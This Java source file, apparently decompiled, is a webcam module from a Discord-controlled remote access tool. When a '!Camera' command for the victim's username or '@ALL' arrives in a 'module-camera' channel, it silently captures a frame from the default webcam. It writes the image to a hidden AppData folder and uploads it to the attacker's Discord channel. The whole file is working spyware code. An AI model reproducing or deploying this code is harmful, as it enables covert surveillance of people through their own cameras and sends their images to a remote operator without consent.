package me.Eclipse.Modules.Impl;

import com.github.sarxos.webcam.Webcam;

import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

import me.Eclipse.Brain;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.utils.AttachmentOption;

public class CameraModule {
    public static int CameraCount;

    public static void run(MessageReceivedEvent var0) {
        MessageChannel var1 = var0.getChannel();
        Message var2 = var0.getMessage();
        if (var2.getChannel().getName().contains("module-camera")) {
            if (var2.getContentDisplay().equalsIgnoreCase("!Camera " + Brain.Username) || var2.getContentDisplay().equalsIgnoreCase("!Camera @ALL")) {
                if (FileData.Ether.exists()) {
                    BufferedImage var3;
                    try {
                        Webcam var4 = Webcam.getDefault();
                        ++CameraCount;
                        if (!var4.isOpen()) {
                            var4.open();
                        }

                        var3 = var4.getImage();
                        if (var4.isOpen()) {
                            var4.close();
                        }
                    } catch (NullPointerException var6) {
                        Helper.sendMessage(Color.RED, "Module Camera (" + Brain.Username + ")", "An error occurred while capturing the camera.", var0);
                        return;
                    }

                    try {
                        ImageIO.write(var3, "JPG", new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Camera_" + CameraCount + ".jpg"));
                    } catch (IOException var5) {
                        Helper.sendMessage(Color.RED, "Module Camera (" + Brain.Username + ")", "An error occurred while sending the camera.", var0);
                        return;
                    }

                    if ((new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Camera_" + CameraCount + ".jpg")).exists()) {
                        Helper.sendMessage(Color.GREEN, "Module Camera (" + Brain.Username + ")", "", var0);
                        var1.sendFile(new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Camera_" + CameraCount + ".jpg"), new AttachmentOption[0]).queue();
                    } else {
                        Helper.sendMessage(Color.RED, "Module Camera (" + Brain.Username + ")", "An error occurred while capturing the camera.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Camera (" + Brain.Username + ")", "Folder not found.", var0);
                    FileData.Ether.mkdir();
                }
            }

        }
    }
}
